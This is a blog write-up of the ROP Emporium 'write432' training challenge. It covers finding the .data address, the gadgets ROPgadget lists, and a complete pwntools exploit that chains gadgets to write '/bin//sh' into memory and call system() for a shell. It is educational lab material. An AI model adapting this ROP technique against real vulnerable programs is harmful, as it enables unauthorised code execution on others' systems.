---
layout: post
title: ROP Emporium - write432
---

### Instruction
Once you've figured out how to write your string into memory and where to write it, go ahead and call system() with its location as your only argument. Are you going to cat flag.txt or drop a shell with /bin/sh? Try to wrap some of your functionality in helper functions, if you can write a 4 or 8 byte value to a location in memory, can you craft a function (in python using pwntools for example) that takes a string and a memory location and returns a ROP chain that will write that string to your chosen location? Crafting templates like this will make your life much easier in the long run.

### Prev step to overflow stack
<https://bhrdn.github.io/ROP-Emporium-ret2win32/>

### Find addr data section
```bash
objdump -D write432 | grep data_start | awk '{print $1}'
```
- __data_start : 0x804a028

### Check function usefulGadgets
```
gef➤  disassemble usefulGadgets
Dump of assembler code for function usefulGadgets:
   0x08048670 <+0>:     mov    DWORD PTR [edi],ebp
   0x08048672 <+2>:     ret    
   0x08048673 <+3>:     xchg   ax,ax
   0x08048675 <+5>:     xchg   ax,ax
   0x08048677 <+7>:     xchg   ax,ax
   0x08048679 <+9>:     xchg   ax,ax
   0x0804867b <+11>:    xchg   ax,ax
   0x0804867d <+13>:    xchg   ax,ax
   0x0804867f <+15>:    nop
End of assembler dump.
```
- mov    DWORD PTR [edi],ebp

### ROPgadget to search gadgets
```bash
ROPgadget --binary write432 | grep "pop edi"
```
```
0x080486d5 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080486d4 : jecxz 0x8048661 ; les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x080486d3 : jne 0x80486c1 ; add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080486d6 : les ecx, ptr [ebx + ebx*2] ; pop esi ; pop edi ; pop ebp ; ret
0x080486d7 : or al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret
0x080486d8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080486da : pop edi ; pop ebp ; ret
0x080486d9 : pop esi ; pop edi ; pop ebp ; ret
```
- 0x080486da : pop edi ; pop ebp ; ret

### Payload
```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('write432')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()

payload = '\x90' * cyclic_find('laaa')
command = '/bin//sh'

DATA_START = 0x804a028
POP_EDI_POP_EBP = 0x080486da

rop = ROP(exe)
for _ in range(0, len(command), 4):
	rop.raw(POP_EDI_POP_EBP)
	rop.raw(DATA_START + _)
	rop.raw(command[_:_ + 4])
	rop.raw(exe.symbols['usefulGadgets'])

rop.system( DATA_START )

io.sendline(payload + rop.__str__())
io.interactive()
```